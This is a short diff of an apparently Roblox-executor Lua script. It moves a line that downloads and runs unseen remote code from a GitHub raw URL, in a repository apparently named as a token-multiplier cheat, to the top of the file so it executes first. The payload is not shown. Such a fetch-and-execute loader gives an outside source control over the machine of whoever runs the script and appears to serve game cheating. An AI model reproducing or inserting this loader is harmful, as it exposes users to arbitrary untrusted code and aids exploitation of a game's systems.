@@ -1,3 +1,6 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/main-luarp/Etfb-TokenMultiplier/refs/heads/main/arthurdevvy"))()
+
 local CoreGui = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
 local StarterGui = game:GetService("StarterGui")
@@ -216,4 +219,3 @@ pcall(function()
 	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
 end)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/main-luarp/Etfb-TokenMultiplier/refs/heads/main/arthurdevvy"))()
